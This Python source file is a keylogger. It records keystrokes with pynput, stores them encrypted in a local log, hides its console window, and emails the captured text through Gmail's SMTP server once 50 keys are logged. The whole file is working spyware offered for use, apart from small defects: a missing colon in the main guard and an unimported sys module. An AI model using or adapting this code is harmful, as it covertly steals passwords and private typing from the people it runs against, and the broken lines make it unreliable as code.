from pynput.keyboard import Key, Listener
import time
import os
import smtplib
import ssl
from cryptography.fernet import Fernet

# Global Variables
keys = []
log_file = 'log.txt'
email_threshold = 50
email_sender = "your_email@gmail.com"  # Replace with your email
email_receiver = "your_email@gmail.com"  # Replace with your email
email_password = "your_password"  # Replace with your email password
key = Fernet.generate_key()
cipher_suite = Fernet(key)


# Function to write to file with encryption
def write_file(keys):
    try:
        plaintext = ''.join([str(k).replace("'", "") + ' ' for k in keys]).encode()
        encrypted_data = cipher_suite.encrypt(plaintext)
        with open(log_file, 'wb') as f:
            f.write(encrypted_data)
    except Exception as e:
        print(f"Error writing to file: {e}")


# Function to send email
def send_email():
    try:
        with open(log_file, 'rb') as f:
            encrypted_data = f.read()
            decrypted_data = cipher_suite.decrypt(encrypted_data).decode()

        message = f"Subject: Keylogger Logs\n\n{decrypted_data}"
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(email_sender, email_password)
            server.sendmail(email_sender, email_receiver, message)
        print("Logs emailed successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")


# Key press event
def on_press(key):
    try:
        keys.append(key)
        write_file(keys)
        print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')

    # Email logs when threshold is reached
    if len(keys) >= email_threshold:
        send_email()
        keys.clear()


# Key release event
def on_release(key):
    print(f'{key} released')
    if key == Key.esc:  # Exit on Esc key
        return False


# Auto-hide the console window
def hide_console():
    if os.name == "nt":  # Windows
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif os.name == "posix":  # Linux/Mac
        sys.stdout = open(os.devnull, 'w')


# Start the keylogger
def start_keylogger():
    hide_console()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__"
    start_keylogger()

